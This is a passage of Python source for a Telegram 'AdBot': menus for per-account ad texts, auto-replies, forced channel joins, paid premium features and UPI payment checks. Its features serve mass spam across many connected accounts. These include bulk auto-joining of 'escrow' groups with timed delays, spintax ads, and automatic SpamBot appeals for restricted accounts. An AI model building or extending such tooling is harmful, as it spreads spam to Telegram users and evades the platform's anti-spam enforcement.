        f"<code>{escape_html(global_ad_text)}</code>\n\n"
    ]

    btn_rows = []

    mode_btn_label = "Switch to Mode 1 (1 Shared Ad)" if ad_mode == "custom" else "Switch to Mode 2 (Separate Ads Per Account)"
    mode_btn_style = "primary" if ad_mode == "custom" else "success"
    mode_icon = _E["globe"] if ad_mode == "custom" else _E["android"]

    btn_rows.append([
        InlineKeyboardButton("Edit Shared Global Ad", callback_data="btn_set_global_ad", icon_custom_emoji_id=_E["pen"], style="primary"),
        InlineKeyboardButton(mode_btn_label, callback_data="btn_toggle_ad_mode", icon_custom_emoji_id=mode_icon, style=mode_btn_style),
    ])

    if accounts:
        lines.append(f"{divider}\n{e('android')} <b>Account-Specific Separate Ad Messages:</b>\n")
        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            p = acc_dict['phone']
            custom_ad = acc_dict.get('custom_ad', '')
            if custom_ad and custom_ad.strip():
                ad_status_str = f"{e('edit')} <i>Custom Ad Set</i>"
                has_custom_ad = True
            else:
                ad_status_str = f"{e('globe')} <i>Uses Shared Global Ad</i>"
                has_custom_ad = False

            lines.append(f"{e('android')} <b>Account #{num_to_emoji(i)} (<code>{p}</code>):</b> {ad_status_str}\n")

            row = [
                InlineKeyboardButton(f"Edit Ad ({p[-4:]})", callback_data=f"set_acc_ad_{p}", icon_custom_emoji_id=_E["pen"], style="primary")
            ]
            if has_custom_ad:
                row.append(InlineKeyboardButton(f"Reset ({p[-4:]})", callback_data=f"clear_acc_ad_{p}", icon_custom_emoji_id=_E["trash"], style="danger"))
            btn_rows.append(row)

    lines.append(f"\n{divider}\n<i>{e('bulb')} Mode 1 = All accounts send 1 shared ad. Mode 2 = Accounts send separate custom ads!</i>")

    btn_rows.append([
        InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary"),
    ])

    text = "".join(lines)
    btns = InlineKeyboardMarkup(btn_rows)

    if edit and update.callback_query:
        await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=btns, parse_mode="HTML", change_video=False)
    else:
        await update.effective_message.reply_text(text, reply_markup=btns, parse_mode="HTML")


async def send_auto_reply_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE, edit=True):
    uid = update.effective_user.id
    ar = db.get_auto_reply(uid)
    status_str = f"Enabled {e('check')}" if ar["enabled"] else f"Disabled {e('cross')}"
    accounts = db.get_accounts(uid, active_only=False)

    header = f"{e('deco_fly_l')} {e('robot')} <b>AUTO REPLY DM CONFIGURATION</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    lines = [
        f"{header}\n{divider}\n\n",
        f"{e('gear')} <b>Auto Reply Status:</b> {status_str}\n\n",
        f"{e('messagt')} <b>Main Global DM Auto Reply Message (Default):</b>\n",
        f"<code>{escape_html(ar['text'])}</code>\n\n"
    ]

    btn_rows = []

    toggle_label = "Turn OFF Auto Reply" if ar["enabled"] else "Turn ON Auto Reply"
    toggle_style = "danger" if ar["enabled"] else "success"
    toggle_icon  = _E["cross"] if ar["enabled"] else _E["fire"]

    btn_rows.append([
        InlineKeyboardButton("Edit Main Global Text", callback_data="btn_ar_edit", icon_custom_emoji_id=_E["pen"], style="primary"),
        InlineKeyboardButton(toggle_label, callback_data="btn_ar_toggle", icon_custom_emoji_id=toggle_icon, style=toggle_style),
    ])

    if accounts:
        lines.append(f"{divider}\n{e('android')} <b>Account-Specific Auto Reply Messages:</b>\n")
        for i, acc in enumerate(accounts, 1):
            acc_dict = dict(acc)
            p = acc_dict['phone']
            custom_ar = acc_dict.get('custom_auto_reply', '')
            if custom_ar and custom_ar.strip():
                ar_mode_str = f"{e('edit')} <i>Custom DM Reply Set</i>"
                has_custom_ar = True
            else:
                ar_mode_str = f"{e('globe')} <i>Uses Main Global Reply</i>"
                has_custom_ar = False

            lines.append(f"{e('android')} <b>Account #{num_to_emoji(i)} (<code>{p}</code>):</b> {ar_mode_str}\n")

            row = [
                InlineKeyboardButton(f"Edit DM Reply ({p[-4:]})", callback_data=f"set_ar_acc_{p}", icon_custom_emoji_id=_E["pen"], style="primary")
            ]
            if has_custom_ar:
                row.append(InlineKeyboardButton(f"Reset DM ({p[-4:]})", callback_data=f"clear_ar_acc_{p}", icon_custom_emoji_id=_E["trash"], style="danger"))
            btn_rows.append(row)

    lines.append(f"\n{divider}\n<i>{e('bulb')} When customers message your accounts in private DM, auto-reply responds instantly!</i>")

    btn_rows.append([
        InlineKeyboardButton("Reset Default Text", callback_data="btn_ar_reset", icon_custom_emoji_id=_E["cross"], style="danger"),
        InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary"),
    ])

    text = "".join(lines)
    btns = InlineKeyboardMarkup(btn_rows)

    if edit and update.callback_query:
        await safe_edit_text_or_caption(update.callback_query, text=text, reply_markup=btns, parse_mode="HTML", change_video=False)
    else:
        await update.effective_message.reply_text(text, reply_markup=btns, parse_mode="HTML")


async def main_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid   = query.from_user.id
    data  = query.data

    if data == "fj_already_joined_1":
        return await query.answer("✅ Channel 1 is already joined!", show_alert=True)
    elif data == "fj_already_joined_2":
        return await query.answer("✅ Channel 2 is already joined!", show_alert=True)

    try:
        await query.answer()
    except Exception:
        pass

    # ── Force Join Check Membership Button ─────────────────
    if data == "btn_check_membership":
        is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
        if not is_joined:
            try:
                await query.answer("❌ You haven't joined both channels yet! Join both and try again.", show_alert=True)
            except Exception:
                pass
            return await send_force_join_prompt(update, ctx, link1, link2, edit=True, joined1=j1, joined2=j2)
        else:
            try:
                await query.answer("🎉 Membership verified! Welcome to AdBot.", show_alert=True)
            except Exception:
                pass
            return await send_landing_screen(update, ctx, edit=True)

    if data == "btn_run_ads_menu":
        return await send_dashboard(update, ctx, edit=True)

    if data == "btn_back_landing":
        return await send_landing_screen(update, ctx, edit=True)

    if data == "btn_deposit_menu":
        ctx.user_data["dep_amt"] = ""
        return await send_deposit_calculator(update, ctx, edit=True)

    if data.startswith("calc_"):
        action = data.split("_")[1]
        amt = ctx.user_data.get("dep_amt", "")

        if action == "pay":
            pay_amt = data.split("_")[2]
            if not pay_amt or int(pay_amt) < 10:
                try:
                    return await query.answer("❌ Minimum deposit is ₹10.", show_alert=True)
                except Exception:
                    pass
            else:
                return await send_payment_gateways(update, ctx, int(pay_amt))
        elif action == "del":
            amt = amt[:-1]
        elif action in ["0", "00", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            amt += action

        # Limit length to 6 digits to avoid abuse
        if len(amt) > 6:
            amt = amt[:6]

        ctx.user_data["dep_amt"] = amt
        return await send_deposit_calculator(update, ctx, edit=True)

    # ── Anti-Leave Force Join Guard ─────────────────────────
    is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
    if not is_joined:
        try:
            await query.answer("⚠️ Mandatory Channel Join Required! Please rejoin both channels.", show_alert=True)
        except Exception:
            pass
        return await send_force_join_prompt(update, ctx, link1, link2, edit=True, joined1=j1, joined2=j2)

    if data == "btn_refresh":
        ctx.user_data.pop("state", None)
        await send_dashboard(update, ctx, edit=True)

    elif data == "btn_premium":
        ctx.user_data.pop("state", None)
        is_prem = db.is_user_premium(uid)
        header = f"{e('deco_fly_l')} {e('crown')} <b>PREMIUM MEMBERSHIP PACKAGE</b> {e('fire')}{e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        status_badge = f"<b>Status:</b> <code>UNLOCKED {e('check')}</code>" if is_prem else f"<b>Status:</b> <code>LOCKED {e('lock')}</code>"

        prem_text = (
            f"{header}\n"
            f"{divider}\n\n"
            f"<b>{e('crown')} Jab tum premium purchase karoge tab tumhe 1200+ escrow groups milegi aur auto channel join option bhi milega, taaki ek-ek karke channel join na karna pade aur tumhara business acha chale! {e('fire')}</b>\n\n"
            f"{status_badge}\n\n"
            f"{divider}\n"
            f"<i>{e('pointer')} Choose a premium feature option below:</i>"
        )

        aj_label = "Auto Join"
        aj_icon  = _E["lightni"] if is_prem else _E["lock"]

        ch_label = "1200+ Channels"
        ch_icon  = _E["chipo"] if is_prem else _E["lock"]

        hc_label = "Account Health Check"
        hc_icon  = _E["shield"] if is_prem else _E["lock"]

        st_label = "Auto Story Ads"
        st_icon  = _E["fire"] if is_prem else _E["lock"]

        qh_label = "Custom Quiet Hours"
        qh_icon  = _E["moon"] if is_prem else _E["lock"]

        lf_label = "Location Group Finder"
        lf_icon  = _E["map"] if is_prem else _E["lock"]

        lead_label = "Live Lead Forwarder"
        lead_icon = _E["bell"] if is_prem else _E["lock"]

        spin_label = "Spintax Ad Generator"
        spin_icon = _E["edit"] if is_prem else _E["lock"]

        appeal_label = "SpamBot Auto Appeal"
        appeal_icon = _E["shield"] if is_prem else _E["lock"]

        prem_markup = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(aj_label, callback_data="btn_prem_autojoin", icon_custom_emoji_id=aj_icon, style="success" if is_prem else "primary"),
                InlineKeyboardButton(ch_label, callback_data="btn_prem_1200channels", icon_custom_emoji_id=ch_icon, style="primary"),
            ],
            [
                InlineKeyboardButton(appeal_label, callback_data="btn_prem_spamappeal", icon_custom_emoji_id=appeal_icon, style="primary"),
            ],
            [
                InlineKeyboardButton("Buy Now", callback_data="btn_prem_buynow", icon_custom_emoji_id=_E["cart"], style="success"),
            ],
            [
                InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary"),
            ]
        ])
        await safe_edit_text_or_caption(query, text=prem_text, reply_markup=prem_markup, parse_mode="HTML", change_video=False)

    elif data == "btn_prem_spamappeal":
        if not db.is_user_premium(uid):
            return await query.answer("🔒 Premium Access Required! Tap Buy Now below to unlock lifetime access for ₹300 INR.", show_alert=True)

        accounts = db.get_accounts(uid, active_only=True)
        if not accounts:
            accounts = db.get_accounts(uid, active_only=False)

        header = f"{e('deco_fly_l')} 🛡️ <b>SPAMBOT 1-CLICK AUTO APPEAL</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        if not accounts:
            return await safe_edit_text_or_caption(
                query,
                text=f"{header}\n{divider}\n\n⚠️ <b>No Telegram accounts connected yet!</b> Please tap <code>Add Account</code> on dashboard first.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )

        await safe_edit_text_or_caption(
            query,
            text=f"{header}\n{divider}\n\n⏳ <b>Scanning account health & finding restricted accounts among {len(accounts)} connected accounts...</b>\n<i>Please wait...</i>",
            reply_markup=None,
            parse_mode="HTML"
        )

        appeal_reports = []
        restricted_count = 0
        for acc in accounts:
            acc_dict = dict(acc)
            phone = acc_dict["phone"]
            health = await broadcaster.check_account_spambot_health(acc_dict["session_string"])

            if not health.get("is_clean"):
                restricted_count += 1
                res = await broadcaster.send_spambot_auto_appeal(acc_dict["session_string"])
                appeal_reports.append(f"📱 <b>Restricted Account <code>{phone}</code>:</b>\n{res.get('msg')}")

        if restricted_count == 0:
            text = (
                f"{header}\n{divider}\n\n"
                f"💚 <b>Great News! All connected Telegram accounts are clean & healthy.</b>\n\n"
                f"✨ <i>No restricted/limited accounts were found. Unban appeal is not required right now!</i>\n\n"
                f"{divider}"
            )
        else:
            text = (
                f"{header}\n{divider}\n\n"
                f"🚨 <b>Found {restricted_count} Restricted Account(s). Auto-Appeal Submitted:</b>\n\n"
                + "\n\n".join(appeal_reports) + "\n\n"
                f"{divider}\n"
                f"<i>💡 Telegram SpamBot usually reviews official appeals within 10-30 minutes.</i>"
            )

        await safe_edit_text_or_caption(
            query,
            text=text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
            parse_mode="HTML"
        )

    elif data == "btn_prem_autojoin":
        if not db.is_user_premium(uid):
            return await query.answer("🔒 Premium Access Required! Tap Buy Now below to unlock lifetime access for ₹300 INR.", show_alert=True)

        accounts = db.get_accounts(uid, active_only=True)
        if not accounts:
            accounts = db.get_accounts(uid, active_only=False)

        header = f"{e('deco_fly_l')} {e('lightni')} <b>SELECT TELEGRAM ACCOUNT FOR AUTO-JOIN</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        if not accounts:
            return await safe_edit_text_or_caption(
                query,
                text=f"{header}\n{divider}\n\n⚠️ <b>No Telegram accounts connected yet!</b> Please tap <code>Add Account</code> on dashboard first.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )

        btn_rows = []
        for acc in accounts:
            acc_dict = dict(acc)
            phone = acc_dict['phone']
            btn_rows.append([
                InlineKeyboardButton(f"📱 Account {phone}", callback_data=f"select_aj_acc_{phone}", icon_custom_emoji_id=_E["android"], style="primary")
            ])
        btn_rows.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")])

        await safe_edit_text_or_caption(
            query,
            text=f"{header}\n{divider}\n\n{e('pointer')} <b>Select which connected Telegram account to run Auto-Join on:</b>",
            reply_markup=InlineKeyboardMarkup(btn_rows),
            parse_mode="HTML"
        )

    elif data.startswith("aj_live_"):
        phone = data.replace("aj_live_", "")
        state = broadcaster.autojoin_state.get((uid, phone))
        if state:
            status = state.get("status", "running")
            joined = state.get("joined", 0)
            failed = state.get("failed", 0)
            expired = state.get("expired", 0)
            total = state.get("total", 0)
            msg = f"📊 Live Check for {phone}\n\nStatus: {status.upper()}\n✅ Joined: {joined}\n❌ Failed: {failed}\n⚠️ Expired: {expired}\nTotal: {joined + failed + expired} / {total}"
            await query.answer(msg, show_alert=True)
        else:
            await query.answer("No active auto-join session found for this account.", show_alert=True)

    elif data.startswith("aj_stop_"):
        phone = data.replace("aj_stop_", "")
        state = broadcaster.autojoin_state.get((uid, phone))
        if state and state.get("status") == "running":
            state["status"] = "stopped"
            await query.answer("🛑 Auto-Join stop signal sent. It will stop before the next join.", show_alert=True)
        else:
            await query.answer("No active auto-join session to stop.", show_alert=True)

    elif data.startswith("dashboard_aj_logs"):
        if not db.is_user_premium(uid):
            return await query.answer("🔒 Premium Access Required!", show_alert=True)
        phone = data.replace("select_aj_acc_", "", 1)
        ctx.user_data["state"] = WAITING_AUTOJOIN_LINKS
        ctx.user_data["aj_phone"] = phone

    elif data.startswith("select_aj_acc_"):
        if not db.is_user_premium(uid):
            return await query.answer("🔒 Premium Access Required!", show_alert=True)
        phone = data.replace("select_aj_acc_", "", 1)
        ctx.user_data["state"] = WAITING_AUTOJOIN_LINKS
        ctx.user_data["aj_phone"] = phone
        header = f"{e('deco_fly_l')} {e('lightni')} <b>PASTE GROUP/CHANNEL LINKS FOR {phone}</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        await safe_edit_text_or_caption(
            query,
            text=(
                f"{header}\n{divider}\n\n"
                f"{e('link')} <b>Send all your group/channel links below in a single message:</b>\n\n"
                f"<i>Our Auto-Join engine will automatically filter out expired links & channel links, calculate exact joining hours, and join all valid groups with a safe 2-minute interval between joins!</i>\n\n"
                f"<i>Type /cancel to abort.</i>"
            ),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="btn_premium", icon_custom_emoji_id=_E["cross"], style="danger")]]),
            parse_mode="HTML"
        )

    # ── View Auto-Joined Group Links (Paginated 20 items per page) ──────
    elif data.startswith("aj_view_joined_"):
        record_str = data.replace("aj_view_joined_", "")
        page = 1
        if "_page_" in record_str:
            parts = record_str.split("_page_")
            record_id = int(parts[0])
            page = int(parts[1])
        else:
            record_id = int(record_str)

        history = db.get_autojoin_history(record_id)
        header  = f"{e('deco_fly_l')} <b>📄 AUTO-JOINED GROUPS LINKS LIST</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        if not history or not history.get("joined_links"):
            return await safe_edit_text_or_caption(
                query,
                text=f"{header}\n{divider}\n\n💭 No auto-joined group links record found.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )

        links       = history["joined_links"]
        phone       = history["phone"]
        total_items = len(links)
        page_size   = 20
        total_pages = math.ceil(total_items / page_size) or 1
        page        = max(1, min(page, total_pages))

        start_idx = (page - 1) * page_size
        end_idx   = start_idx + page_size
        chunk     = links[start_idx:end_idx]

        links_formatted = "\n".join(f"🔹 <b>[{start_idx + idx + 1}]</b> <code>{escape_html(lnk)}</code>" for idx, lnk in enumerate(chunk))

        text = (
            f"{header}\n{divider}\n\n"
            f"📱 <b>Account:</b> <code>{phone}</code> | <b>Total Joined:</b> <code>{total_items}</code>\n"
            f"📄 <b>Page {page} of {total_pages}</b>\n\n"
            f"{links_formatted}\n\n"
            f"{divider}\n"
            f"<i>⚡ Showing all joined group links without truncation. Tap button below to download full .txt file!</i>"
        )

        buttons = []
        nav_row = []
        if page > 1:
            nav_row.append(InlineKeyboardButton("Previous", callback_data=f"aj_view_joined_{record_id}_page_{page-1}", icon_custom_emoji_id=_E["arrow"], style="primary"))
        nav_row.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="btn_refresh", icon_custom_emoji_id=_E["globe"]))
        if page < total_pages:
            nav_row.append(InlineKeyboardButton("Next", callback_data=f"aj_view_joined_{record_id}_page_{page+1}", icon_custom_emoji_id=_E["arrow"], style="primary"))

        if nav_row:
            buttons.append(nav_row)

        buttons.append([InlineKeyboardButton("📥 Download All Links (.txt)", callback_data=f"aj_dl_joined_{record_id}", icon_custom_emoji_id=_E["download"], style="success")])
        buttons.append([InlineKeyboardButton("Back to Dashboard", callback_data="btn_refresh", icon_custom_emoji_id=_E["arrow"], style="danger")])

        await safe_edit_text_or_caption(query, text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")

    # ── Download All Auto-Joined Group Links File (.txt) ─────────
    elif data.startswith("aj_dl_joined_"):
        record_id = int(data.replace("aj_dl_joined_", ""))
        history   = db.get_autojoin_history(record_id)
        if not history or not history.get("joined_links"):
            return await query.message.reply_text(f"{e('cross')} No record found to download.", parse_mode="HTML")

        links = history["joined_links"]
        phone = history["phone"]
        filename = f"joined_groups_{phone.replace('+', '')}.txt"

        lines = [
            "===========================================================",
            "LUXURY ADBOT - AUTO-JOINED GROUPS COMPLETE LINKS LIST",
            f"Account Phone : {phone}",
            f"Total Joined  : {len(links)}",
            f"Greeting Msg  : hello (sent 10s after joining each group)",
            f"Date          : {history.get('created_at', 'N/A')}",
            "===========================================================\n"
        ]
        for idx, lnk in enumerate(links, 1):
            lines.append(f"[{idx}] {lnk}")

        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        with open(filename, "rb") as doc_file:
            await query.message.reply_document(
                document=doc_file,
                filename=filename,
                caption=f"📄 <b>All {len(links)} Auto-Joined Group Links for Account:</b> <code>{phone}</code>",
                parse_mode="HTML"
            )
        try:
            os.remove(filename)
        except Exception:
            pass

    elif data == "btn_prem_1200channels":
        if not db.is_user_premium(uid):
            return await query.answer("🔒 Premium Access Required! Tap Buy Now below to unlock lifetime access for ₹300 INR.", show_alert=True)

        escrow_links = db.get_escrow_channels()
        header = f"{e('deco_fly_l')} {e('chipo')} <b>1200+ PREMIUM ESCROW CHANNELS LIST</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        if not escrow_links:
            escrow_text = f"{header}\n{divider}\n\n📢 <b>1200+ Escrow Channels List:</b>\n\n<i>List is updated daily by Admin! Contact Admin for latest link dumps.</i>"
        else:
            sample_links = "\n".join(f"🔹 {idx}. {link}" for idx, link in enumerate(escrow_links[:50], 1))
            total_cnt = len(escrow_links)
            escrow_text = f"{header}\n{divider}\n\n📢 <b>1200+ Active Escrow Channels List (Total: {total_cnt}):</b>\n\n{sample_links}\n\n<i>Showing first 50 channels. Updated daily!</i>"

        await safe_edit_text_or_caption(
            query,
            text=escrow_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
            parse_mode="HTML"
        )

    elif data == "btn_prem_buynow":
        price = db.get_premium_price()
        header = f"{e('deco_fly_l')} {e('cart')} <b>BUY PREMIUM MEMBERSHIP</b> {e('fire')}{e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
        buy_text = (
            f"{header}\n{divider}\n\n"
            f"<b>{e('crown')} Premium Package Features:</b>\n"
            f"<i>This premium channel list is updated daily.</i>\n\n"
            f"<b>Price:</b> <b>₹{price:.0f} INR</b>\n"
            f"<b>Description:</b> Lifetime Access (1200+ Escrow Groups + Auto-Join)\n\n"
            f"{divider}\n"
            f"<i>{e('pointer')} Tap Pay ₹{price:.0f} Now to generate your dynamic FamPay UPI QR code:</i>"
        )
        await safe_edit_text_or_caption(
            query,
            text=buy_text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"Pay ₹{price:.0f} Now", callback_data="btn_prem_pay_qr", icon_custom_emoji_id=_E["cash"], style="success")],
                [InlineKeyboardButton("Back to Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["arrow"], style="primary")]
            ]),
            parse_mode="HTML"
        )

    elif data == "btn_prem_pay_qr":
        ctx.user_data.pop("state", None)  # Don't wait until they click Verify
        upi_id = db.get_fampay_upi_id()
        price = db.get_premium_price()

        # Record pending payment intent
        db.record_payment_screenshot(uid, "")

        qr_caption = (
            f"{e('lightni')} <b>PREMIUM VIP PAYMENT</b> {e('lightni')}\n\n"
            f"{e('crown')} <b>Package:</b> Premium VIP (Lifetime)\n"
            f"{e('money')} <b>Amount:</b> <b>₹{price:.0f} INR</b>\n"
            f"{e('card')} <b>UPI ID:</b> <code>{upi_id}</code>\n\n"
            f"{e('warning')} <b>Note:</b> After successful payment, please click 'Verify Payment' to confirm."
        )


        # 1. Try dynamic in-memory QR code image generation
        try:
            qr_bytes = fampay_engine.generate_upi_qr_bytes(upi_id, price, note=f"Prem_{uid}", payee_name="Pradip")
            return await query.message.reply_photo(
                photo=qr_bytes,
                caption=qr_caption,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                    [InlineKeyboardButton("Cancel", callback_data="btn_premium", icon_custom_emoji_id=_E["cross"], style="danger")]
                ]),
                parse_mode="HTML"
            )
        except Exception as qr_err:
            logger.warning(f"Dynamic QR generation fallback: {qr_err}")
            qr_photo = db.get_config("qr_photo_id")
            if qr_photo:
                try:
                    return await query.message.reply_photo(
                        photo=qr_photo,
                        caption=qr_caption,
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                            [InlineKeyboardButton("Cancel", callback_data="btn_premium", icon_custom_emoji_id=_E["cross"], style="danger")]
                        ]),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

        await safe_edit_text_or_caption(
            query,
            text=qr_caption,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                [InlineKeyboardButton("Cancel", callback_data="btn_premium", icon_custom_emoji_id=_E["cross"], style="danger")]
            ]),
            parse_mode="HTML"
        )

    elif data.startswith("pay_"):
        try:
            pay_amt = data.split("_")[2]
            price = int(pay_amt)
        except (IndexError, ValueError):
            price = 0

        if price < 10:
            try:
                return await query.answer("❌ Minimum deposit is ₹10.", show_alert=True)
            except Exception:
                pass
            return

        upi_id = db.get_fampay_upi_id()
        if not upi_id:
            try:
                await query.answer("❌ Payments are temporarily disabled (No UPI ID).", show_alert=True)
            except:
                pass
            return

        qr_caption = (
            f"💰 <b>DEPOSIT ₹{price} INR</b>\n\n"
            f"🔹 Scan this QR with <b>FamPay, PhonePe, Paytm, GPay, etc.</b>\n"
            f"🔹 <b>Amount:</b> ₹{price}\n"
            f"🔹 <b>UPI ID:</b> <code>{upi_id}</code>\n\n"
            f"<i>After successful payment, click 'Verify Payment' below.</i>"
        )

        ctx.user_data["pending_dep_amt"] = price
        ctx.user_data["pending_dep_type"] = "deposit"

        # 1. Try dynamic in-memory QR code image generation
        try:
            qr_bytes = fampay_engine.generate_upi_qr_bytes(upi_id, price, note=f"Dep_{uid}", payee_name="Pradip")
            await query.message.delete()
            return await update.effective_chat.send_photo(
                photo=qr_bytes,
                caption=qr_caption,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                    [InlineKeyboardButton("« Back", callback_data="btn_deposit_menu", style="primary")]
                ]),
                parse_mode="HTML"
            )
        except Exception as qr_err:
            logger.warning(f"Dynamic QR generation fallback: {qr_err}")
            qr_photo = db.get_config("qr_photo_id")
            if qr_photo:
                try:
                    await query.message.delete()
                    return await update.effective_chat.send_photo(
                        photo=qr_photo,
                        caption=qr_caption,
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                            [InlineKeyboardButton("« Back", callback_data="btn_deposit_menu", style="primary")]
                        ]),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

        return await safe_edit_text_or_caption(
            query,
            text=qr_caption,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Verify Payment", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                [InlineKeyboardButton("« Back", callback_data="btn_deposit_menu", style="primary")]
            ]),
            parse_mode="HTML"
        )

    elif data in ["btn_verify_payment", "btn_check_pay_status"]:
        if db.is_user_premium(uid):
            await query.answer("🎉 Premium Membership is ALREADY ACTIVE!", show_alert=True)
            try:
                return await query.edit_message_caption(
                    caption=f"🎉 <b>Your Premium Membership is ACTIVE!</b>\n\nTap below to access 1200+ Escrow channels and VIP features.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Open Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["crown"], style="success")]]),
                    parse_mode="HTML"
                )
            except Exception:
                pass
            return

        await query.answer("Processing...", show_alert=False)

        price = db.get_premium_price()
        try:
            await query.edit_message_caption(
                caption=f"⌛ <b>Verifying your payment of ₹{price:.0f}...</b>\n\n<i>{e('lightni')} Securely checking bank servers, please wait...</i>",
                parse_mode="HTML"
            )
        except Exception:
            pass

        # Trigger immediate sync for both engines
        try:
            await fampay_engine.sync_fampay_transactions()
        except Exception:
            pass

        try:
            import gmail_payment_engine
            await gmail_payment_engine.scan_and_auto_credit_gmail()
        except Exception:
            pass

        if db.is_user_premium(uid):
            await query.answer("🎉 Payment Verified! Premium Unlocked!", show_alert=True)
            try:
                return await query.edit_message_caption(
                    caption=f"🎉 <b>Payment Verified! Your Premium Membership is now Active!</b>\n\nTap below to access 1200+ Escrow channels and VIP features.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Open Premium Menu", callback_data="btn_premium", icon_custom_emoji_id=_E["crown"], style="success")]]),
                    parse_mode="HTML"
                )
            except Exception:
                pass
        else:
            await query.answer("⌛ Payment not found yet. Please wait 1-2 minutes.", show_alert=True)
            try:
                # Revert back to the QR code message with a try again button
                upi_id = db.get_fampay_upi_id()
                qr_caption = (
                    f"{e('lightni')} <b>PREMIUM VIP PAYMENT</b> {e('lightni')}\n\n"
                    f"{e('crown')} <b>Package:</b> Premium VIP (Lifetime)\n"
                    f"{e('money')} <b>Amount:</b> <b>₹{price:.0f} INR</b>\n"
                    f"{e('card')} <b>UPI ID:</b> <code>{upi_id}</code>\n\n"
                    f"❌ <b>Payment not found yet.</b>\n"
                    f"<i>If you just paid, it takes 1-2 minutes to arrive. Please try clicking Verify again.</i>"
                )
                await query.edit_message_caption(
                    caption=qr_caption,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 Try Verifying Again", callback_data="btn_verify_payment", icon_custom_emoji_id=_E["check"], style="success")],
                        [InlineKeyboardButton("Cancel", callback_data="btn_premium", icon_custom_emoji_id=_E["cross"], style="danger")]
                    ]),
                    parse_mode="HTML"
                )
            except Exception:
                pass

    elif data == "btn_autoreply":
